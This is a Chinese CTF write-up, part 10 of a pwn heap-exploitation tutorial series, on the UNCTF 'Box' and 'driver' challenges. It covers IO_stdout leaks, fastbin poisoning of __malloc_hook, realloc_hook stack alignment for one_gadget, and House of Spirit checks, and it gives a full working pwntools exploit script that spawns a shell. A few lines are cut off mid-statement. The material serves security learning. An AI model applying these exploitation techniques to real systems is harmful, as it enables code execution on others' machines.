# pwn堆入门系列教程10
[pwn堆入门系列教程1](https://xz.aliyun.com/t/6087)  
[pwn堆入门系列教程2](https://xz.aliyun.com/t/6169)  
[pwn堆入门系列教程3](https://xz.aliyun.com/t/6252)  
[pwn堆入门系列教程4](https://xz.aliyun.com/t/6322)  
[pwn堆入门系列教程5](https://xz.aliyun.com/t/6377)  
[pwn堆入门系列教程6](https://xz.aliyun.com/t/6406)  
[pwn堆入门系列教程7](https://xz.aliyun.com/t/6449)  
[pwn堆入门系列教程8](https://xz.aliyun.com/t/6473)  
[pwn堆入门系列教程9](https://xz.aliyun.com/t/6556)
这个系列完结了吧，入门系列做到这里我感觉已经入门了，后面的就是靠自己去多练习，多学新点了，我这系列最后一篇就发下近期遇到的一些骚操作和新思路吧
## unctf Box
### 漏洞点
数组index是可以输入负数的，就是不会利用,后面看了萝卜师傅的wp才知道可以直接改IO_stdout
我是傻逼！这都想不到
然后有个double free,新点记录下
  * size == 0 ，这个时候等同于free
  * realloc_ptr == 0 && size > 0 ， 这个时候等同于malloc
  * malloc_usable_size(realloc_ptr) >= size， 这个时候等同于edit
  * malloc_usable_size(realloc_ptr) 
    gdb-peda$ disassemble 0x7f4137102130 
    Dump of assembler code for function __GI___libc_malloc:
       0x00007f4137102130 : push   rbp
       0x00007f4137102131 : push   rbx
       0x00007f4137102132 : sub    rsp,0x8
       0x00007f4137102136 : mov    rax,QWORD PTR [rip+0x33fdb3]        # 0x7f4137441ef0
       0x00007f413710213d :    mov    rax,QWORD PTR [rax]
       0x00007f4137102140 :    test   rax,rax
       0x00007f4137102143 :    jne    0x7f4137102298 
       0x00007f4137102149 :    mov    rax,QWORD PTR [rip+0x33fc40]        # 0x7
看函数头，我们发觉有两个push，一个sub rsp,0x8,  
计算下我们有0x18可控，所以我们提高0x10的话，就从+2开始就行了，  
所以 **payload = "a"*0xb + p64(malloc+0x2) + p64(libc.address + one_gadget[1])**  
前面的a填充过后就是realloc_hook，覆盖成malloc+0x2，所以这样让栈提高0x10,接下来是malloc函数，
具体个执行过程呢就是realloc_hook被覆盖成malloc+2了，malloc_hook被覆盖成one_gadget了，  
所以先执行的是malloc+2,然后执行malloc_hook
    0x7f1e223d2132           sub    rsp, 8
     ► 0x7f1e223d2136           mov    rax, qword ptr [rip + 0x33fdb3] 
       0x7f1e223d213d          mov    rax, qword ptr [rax]
       0x7f1e223d2140          test   rax, rax
       0x7f1e223d2143          jne    malloc+360 
        ↓
       0x7f1e223d2298         mov    rsi, qword ptr [rsp + 0x18]
       0x7f1e223d229d         add    rsp, 8
       0x7f1e223d22a1         pop    rbx
       0x7f1e223d22a2         pop    rbp
       0x7f1e223d22a3         jmp    rax
        ↓
       0x7f1e2239326a     mov    rax, qword ptr [rip + 0x37ec47]
    void *
    __libc_malloc (size_t bytes) 
    {
      mstate ar_ptr;
      void *victim;
      void *(*hook) (size_t, const void *) 
        = atomic_forced_read (__malloc_hook);
      if (__builtin_expect (hook != NULL, 0))
        return (*hook)(bytes, RETURN_ADDRESS (0));
    }
malloc调用前会查看mallo_hook是否存在，存在就调用malloc_hook
    0x00007f1e223d2130 : push   rbp
       0x00007f1e223d2131 : push   rbx
       0x00007f1e223d2132 : sub    rsp,0x8
    => 0x00007f1e223d2136 : mov    rax,QWORD PTR [rip+0x33fdb3]        # 0x7f1e22711ef0
       0x00007f1e223d213d :    mov    rax,QWORD PTR [rax]
       0x00007f1e223d2140 :    test   rax,rax
       0x00007f1e223d2143 :    jne    0x7f1e223d2298 
这里就是查看malloc_hook部分，若有调到+360处
看，成功迁移位置
这个其实可以从malloc_hook调到realloc_hook，自然也可以跳别的函数，发挥想象
### exp
    #!/usr/bin/env python2
    # -*- coding: utf-8 -*-    from pwn import *
    local = 1
    host = '127.0.0.1' 
    port = 10000
    context.log_level = 'debug'
    exe = '/tmp/tmp.a0yo4SjOZB/Box'
    context.binary = exe
    elf = ELF(exe)
    libc = elf.libc
    #don't forget to change it
    if local:
        io = process(exe)
    else:
        io = remote(host,port)
    s    = lambda data            : io.send(str(data))
    sa   = lambda delim,data      : io.sendafter(str(delim), str(data))
    sl   = lambda data            : io.sendline(str(data))
    sla  = lambda delim,data      : io.sendlineafter(str(delim), str(data))
    r    = lambda numb=4096       : io.recv(numb)
    ru   = lambda delim,drop=True : io.recvuntil(delim, drop)
    uu32 = lambda data            : u32(data.ljust(4, '\x00'))
    uu64 = lambda data            : u64(data.ljust(8, '\x00'))
    lg   = lambda name,data       : io.success(name + ": 0x%x" % data)
    text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
    # break on aim addr
    def debug(addr,PIE=True):
        if PIE:
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
            gdb.attach(io,'b *{}'.format(hex(text_base+addr)))
        else:
            gdb.attach(io,"b *{}".format(hex(addr)))
    #===========================================================
    #                    EXPLOIT GOES HERE
    #===========================================================
    # Arch:     amd64-64-little
    # RELRO:    Full RELRO
    # Stack:    Canary found
    # NX:       NX enabled
    # PIE:      PIE enabled
    # RUNPATH:  '/usr/lib/glibc/2.23-0ubuntu10_amd64/'
    def c(idx):
        sla("Your Choice: ", str(idx))
    def new(idx, size):
        c(1)
        sla("Box ID: ", str(idx))
        sla("Box Size: ", str(size))
    def edit(idx, content):
        c(2)
        sla("Box ID: ", str(idx))
        sla("Box Content: ", content)
    def free(idx):
        c(3)
        sla("Box ID: ", str(idx))
    def exit():
        c(4)
    def exp():
        payload = p64(0xfbad1800)+ p64(0)*3 + '\x00'
        edit(-12, payload)
        lg("text_base", text_base)
        addr = uu64(r(8))
        libc.address = addr - 0x18c7c2
        if (libc.address&0xffff)%0x1000!=0:
            raise EOFError
        lg("addr", addr)
        new(0, 0x68)
        new(1, 0x68)
        free(0)
        new(1, 0)
        new(0, 0)
        new(0, 0x68)
        new(1, 0x68)
        edit(0, p64(libc.symbols['__malloc_hook']-0x23))
        new(2, 0x68)
        new(3, 0x68)
        one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
        realloc = libc.symbols['__libc_realloc']
        malloc_hook = libc.symbols['__malloc_hook']
        malloc = libc.symbols['__libc_malloc']
        payload = "a"*0xb + p64(0xAAAAAAAA) 
        #payload = "a"*0xb + p64(malloc+0x1) + p64(libc.address + one_gadget[2])
        payload = "a"*0xb + p64(malloc+0x2) + p64(libc.address + one_gadget[1])
        edit(3, payload)
        gdb.attach(io)
        new(0, 1)
    if __name__ == '__main__':
        while True:
            try:
                exp()
                io.interactive()
                break
            except Exception as e:
                print(e)
                io.close()
                io = process(exe)
## unctf driver
开头没想到怎么利用，他利用了top_chunk合并将unsortbin合并了，以前只是防止合并，利用合并也是个知识盲点
    /*
              If the chunk borders the current high end of memory,
              consolidate into top
            */
            // 如果要释放的chunk的下一个chunk是top chunk，那就合并到 top chunk
            else {
                size += nextsize;
                set_head(p, size | PREV_INUSE);
                av->top = p;
                check_chunk(av, p);
            }
House Of Spirit¶  
介绍  
House of Spirit 是 the Malloc Maleficarum 中的一种技术。
该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配指定地址的 chunk 的目的。
要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即
fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。  
fake chunk 地址需要对齐， MALLOC_ALIGN_MASK  
fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。  
fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于av->system_mem 。  
fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。
又补充了知识盲区，要将chunk放入fastbin，得过掉检查，其中一个便是下一个chunk的size检查，不能小于两倍的size_s，并且不能大于sysstem_mem
    /*
          If eligible, place chunk on a fastbin so it can be found
          and used quickly in malloc.
        */
        if ((unsigned long) (size) top)
    #endif
                ) {
            // 下一个chunk的大小不能小于两倍的SIZE_SZ,并且
            // 下一个chunk的大小不能大于system_mem， 一般为132k
            // 如果出现这样的情况，就报错。